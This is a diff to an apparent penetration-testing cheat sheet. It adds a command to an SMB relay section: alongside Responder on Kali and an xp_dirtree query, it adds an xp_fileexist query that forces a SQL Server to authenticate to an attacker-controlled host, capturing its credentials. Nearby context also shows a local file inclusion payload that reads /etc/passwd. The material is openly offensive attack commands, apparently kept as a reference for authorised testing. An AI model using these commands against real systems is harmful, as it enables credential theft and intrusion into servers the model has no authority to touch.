@@ -291,6 +291,7 @@ MySQL
   SMB Relay through xp_dirtree:  
   Run responder on kali with `/opt/Responder/Responder.py -I eth0 -w -r -f -d`   
   Initiate connection on xp_dirtree vulnerable sql server: `Get-SQLQuery -Verbose -Instance "servername.domain.local,1433" -Query "EXEC master.sys.xp_dirtree '\\<kali-ip>\test123'"`   
+  or: `Get-SQLQuery -Instance servername.domain.local -Query "xp_fileexist '\\<kaliip>\file'" -Verbose | out-null`   
 
 ## File inclusion
 - LFI: http://target.com/?page=home --> http://target.com/?page=./../../../../../../../../../etc/passwd%00
